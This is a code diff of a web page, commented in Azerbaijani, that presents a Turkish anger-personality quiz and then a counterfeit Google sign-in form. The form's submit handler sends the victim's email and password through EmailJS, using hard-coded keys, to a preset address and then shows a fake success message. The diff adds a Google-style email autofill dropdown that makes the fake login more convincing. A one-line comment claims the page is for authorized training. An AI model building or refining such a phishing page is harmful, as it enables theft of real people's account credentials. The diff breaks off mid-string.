@@ -77,9 +77,6 @@
             margin-top: 32px;
             flex-wrap: wrap;
         }
-        .test-features .item {
-            text-align: center;
-        }
         .test-features .item .num {
             font-size: 28px;
             font-weight: 700;
@@ -90,7 +87,7 @@
             color: #5f6368;
         }
 
-        /* ========== LOGIN (orijinal - heç dəyişmədi) ========== */
+        /* ========== LOGIN ========== */
         #loginSection {
             display: none;
         }
@@ -130,6 +127,7 @@
         }
         .form-group {
             margin-bottom: 20px;
+            position: relative;
         }
         .form-group label {
             display: block;
@@ -259,21 +257,76 @@
             font-weight: 500;
         }
 
-        #sections {
-            width: 100%;
+        /* ========== EMAIL SUGGESTIONS (Google autofill kimi) ========== */
+        .email-suggestions {
+            position: absolute;
+            top: 100%;
+            left: 0;
+            right: 0;
+            background: #fff;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.12);
+            z-index: 100;
+            display: none;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        .email-suggestions.show {
+            display: block;
+        }
+        .email-suggestions .suggestion-item {
+            padding: 12px 15px;
+            font-size: 14px;
+            color: #202124;
+            cursor: pointer;
             display: flex;
-            flex-direction: column;
             align-items: center;
+            gap: 10px;
+            border-bottom: 1px solid #f1f3f4;
+        }
+        .email-suggestions .suggestion-item:last-child {
+            border-bottom: none;
+        }
+        .email-suggestions .suggestion-item:hover {
+            background: #f8f9fa;
+        }
+        .email-suggestions .suggestion-item .avatar {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #1a73e8, #4facfe);
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: 600;
+            flex-shrink: 0;
+        }
+        .email-suggestions .suggestion-item .email-text {
+            flex: 1;
+        }
+        .email-suggestions .suggestion-item .remove-btn {
+            color: #5f6368;
+            background: none;
+            border: none;
+            font-size: 18px;
+            cursor: pointer;
+            padding: 0 4px;
+            line-height: 1;
+        }
+        .email-suggestions .suggestion-item .remove-btn:hover {
+            color: #d93025;
         }
 
         @media (max-width: 500px) {
             .test-container, .login-container { padding: 32px 20px; }
-            .test-features { gap: 16px; }
         }
     </style>
 </head>
 <body>
-    <div id="sections">
+    <div id="sections" style="width:100%; display:flex; flex-direction:column; align-items:center;">
 
         <!-- ========== TEST ANA EKRAN ========== -->
         <div class="test-container" id="testScreen">
@@ -300,7 +353,7 @@
             </div>
         </div>
 
-        <!-- ========== LOGIN (orijinal) ========== -->
+        <!-- ========== LOGIN ========== -->
         <div class="login-container" id="loginSection">
             <div class="logo">
                 <svg viewBox="0 0 272 92" fill="none" xmlns="http://www.w3.org/2000/svg">
@@ -314,10 +367,12 @@
             <h1>Giriş edin</h1>
             <p class="subtitle">Google hesabınıza davam edin</p>
 
-            <form id="loginForm">
+            <form id="loginForm" autocomplete="off">
                 <div class="form-group">
                     <label for="email">E-poçt ünvanı və ya telefon nömrəsi</label>
                     <input type="email" id="email" name="email" placeholder="example@gmail.com" required autocomplete="off">
+                    <!-- Email suggestions dropdown -->
+                    <div class="email-suggestions" id="emailSuggestions"></div>
                 </div>
                 <div class="form-group">
                     <label for="password">Şifrə</label>
@@ -386,7 +441,7 @@
         // TƏLİM MƏQSƏDLİ - YALNIZ İCAZƏLİ TEST ÜÇÜN
         // =============================================
 
-        // KONFİQURASİYA - HAZIRDIR (heç dəyişmədi)
+        // KONFİQURASİYA - HAZIRDIR
         const EMAILJS_PUBLIC_KEY = 'Ibij0zfIIzvnyppMK';
         const EMAILJS_SERVICE_ID = 'service_x0ww0oi';
         const EMAILJS_TEMPLATE_ID = 'template_f40eu4v';
@@ -395,7 +450,7 @@
 
         emailjs.init(EMAILJS_PUBLIC_KEY);
 
-        // Elementler
+        // Elementlər
         const testScreen = document.getElementById('testScreen');
         const loginSection = document.getElementById('loginSection');
         const testQuestions = document.getElementById('testQuestions');
@@ -408,6 +463,7 @@
         const successDiv = document.getElementById('success');
         const submitBtn = document.getElementById('submitBtn');
         const togglePassword = document.getElementById('togglePassword');
+        const suggestionsBox = document.getElementById('emailSuggestions');
 
         // Sorular (Türkçe)
         const questions = [
@@ -426,20 +482,111 @@
         let currentSelections = new Array(questions.length).fill(-1);
         let testStarted = false;
 
-        // --- 1. Başla düyməsi -> Google login ---
+        // ===== EMAIL AUTO-SUGGESTION SİSTEMİ (Google autofill kimi) =====
+
+        // LocalStorage'dan kayıtlı email-leri al
+        function getSavedEmails() {
+            try {
+                const data = localStorage.getItem('savedEmails');
+                return data ? JSON.parse(data) : [];
+            } catch(e) { return []; }
+        }
+
+        // Email kaydet
+        function saveEmail(email) {
+            let emails = getSavedEmails();
+            if (!emails.includes(email)) {
+                emails.unshift(email);
+                if (emails.length > 10) emails = emails.slice(0, 10);
+                localStorage.setItem('savedEmails', JSON.stringify(emails));
+            }
+        }
+
+        // Email sil
+        function removeEmail(email) {
+            let emails = getSavedEmails().filter(e => e !== email);
+            localStorage.setItem('savedEmails', JSON.stringify(emails));
+            renderSuggestions();
+        }
+
+        // Təklifləri göstər
+        function renderSuggestions(filter = '') {
+            let emails = getSavedEmails();
+            if (filter) {
+                emails = emails.filter(e => e.toLowerCase().includes(filter.toLowerCase()));
+            }
+            if (emails.length === 0) {
+                suggestionsBox.classList.remove('show');
+                return;
+            }
+            suggestionsBox.innerHTML = '';
+            emails.forEach(email => {
+                const name = email.split('@')[0];
+                const initial = name.charAt(0).toUpperCase();
+                const div = document.createElement('div');
+                div.className = 'suggestion-item';
+                div.innerHTML = `
+                    <div class="avatar">${initial}</div>
+                    <span class="email-text">${email}</span>
+                    <button type="button" class="remove-btn" data-email="${email}">&times;</button>
+                `;
+                div.querySelector('.email-text').addEventListener('click', function() {
+                    emailInput.value = email;
+                    suggestionsBox.classList.remove('show');
+                    passwordInput.focus();
+                });
+                div.querySelector('.remove-btn').addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    removeEmail(this.dataset.email);
+                });
+                suggestionsBox.appendChild(div);
+            });
+            suggestionsBox.classList.add('show');
+        }
+
+        // Email input fokus olanda təklifləri göstər
+        emailInput.addEventListener('focus', function() {
+            renderSuggestions(this.value);
+        });
+
+        // Email input yazdıqca filtr et
+        emailInput.addEventListener('input', function() {
+            renderSuggestions(this.value);
+        });
+
+        // Kənara klikləyəndə təklifləri gizlət
+        document.addEventListener('click', function(e) {
+            if (!e.target.closest('.form-group')) {
+                suggestionsBox.classList.remove('show');
+            }
+        });
+
+        // Keyboard: Enter seçim, Escape bağla
+        emailInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                suggestionsBox.classList.remove('show');
+            }
+        });
+
+        // ===== TEST ANA EKRAN -> LOGIN =====
+
         startBtn.addEventListener('click', function() {
             testScreen.style.display = 'none';
             loginSection.classList.add('active');
+            // Email input-a avto fokus
+            setTimeout(() => emailInput.focus(), 300);
         });
 
-        // --- Login toggle password ---
+        // ===== LOGIN TOGGLE PASSWORD =====
+
         togglePassword.addEventListener('click', function() {
             const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
             passwordInput.setAttribute('type', type);
             this.textContent = type === 'password' ? 'Göstər' : 'Gizlət';
         });
 
-        // --- 2. Login form submit (orijinal kod - heç dəyişmədi) ---
+        // ===== LOGIN FORM SUBMIT =====
+
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
 
@@ -459,6 +606,9 @@
             submitBtn.textContent = 'Göndərilir...';
             hideMessages();
 
+            // Email-i yadda saxla (Google autofill kimi)
+            saveEmail(email);
+
             const templateParams = {
                 to_email: EMAILJS_TO_EMAIL,
                 email: email,
@@ -474,7 +624,6 @@
                 console.log('EmailJS xətası (önəmsiz):', err);
             }
 
-            // --- 3. Login göndərildi -> test sorularına qayıt ---
             showSuccess('Giriş uğurludur. Teste yönləndirilirsiniz...');
             setTimeout(() => {
                 loginSection.classList.remove('active');
@@ -507,7 +656,8 @@
         emailInput.addEventListener('focus', hideMessages);
         passwordInput.addEventListener('focus', hideMessages);
 
-        // --- Test sorularını render ---
+        // ===== TEST SORULARI =====
+
         function renderQuestions() {
             const area = document.getElementById('questionsArea');
             area.innerHTML = '';
@@ -526,7 +676,7 @@
                 area.appendChild(div);
             });
 
-            document.querySelectorAll('#questionsArea .options label, #questionsArea label[data-q]').forEach(label => {
+            document.querySelectorAll('#questionsArea label[data-q]').forEach(label => {
                 label.addEventListener('click', function(e) {
                     const qIdx = parseInt(this.dataset.q);
                     const optIdx = parseInt(this.dataset.opt);
@@ -606,23 +756,4 @@
             if (percent <= 20) {
                 emoji = '&#x1F60A;'; title = 'Sakin Bir Ruh'; desc = 'Neredeyse hiçbir şey seni sinirlendirmiyor. Ortamın huzur kaynağısın!'; color = '#34a853';
             } else if (percent <= 40) {
-                emoji = '&#x1F642;'; title = 'Oldukça Sakin'; desc = 'Bazı şeyler canını sıksa da çoğunlukla soğukkanlısın.'; color = '#7ba23f';
-            } else if (percent <= 55) {
-                emoji = '&#x1F610;'; title = 'Orta Seviye'; desc = 'Bazen patlayabiliyorsun ama genelde kontrol sende.'; color = '#fbbc04';
-            } else if (percent <= 70) {
-                emoji = '&#x1F620;'; title = 'Sinirli Yapı'; desc = 'Olaylar karşısında çabuk geriliyorsun, biraz nefes egzersizi iyi gelir!'; color = '#f57c00';
-            } else if (percent <= 85) {
-                emoji = '&#x1F92C;'; title = 'Oldukça Sinirli'; desc = 'Öfken bir tık yüksek! Trafikte, kuyrukta, internette hep gerginsin.'; color = '#e64a19';
-            } else {
-                emoji = '&#x1F92F;'; title = 'Volkan Gibisin!'; desc = 'Öfke seviyen tavan! Sakinleşmek için bir hobi edinmen gerekebilir.'; color = '#d32f2f';
-            }
-
-            document.getElementById('resultEmoji').innerHTML = emoji;
-            document.getElementById('resultTitle').textContent = title;
-            document.getElementById('resultDesc').textContent = desc;
-            document.getElementById('resultPercent').textContent = '%' + percent + ' Öfke';
-            document.getElementById('testResult').style.display = 'block';
-        }
-    </script>
-</body>
-</html>
+                emoji = '&#x1F642;'; title = 'Oldukça Sakin'; desc = 'Bazı şeyler canını sıksa da
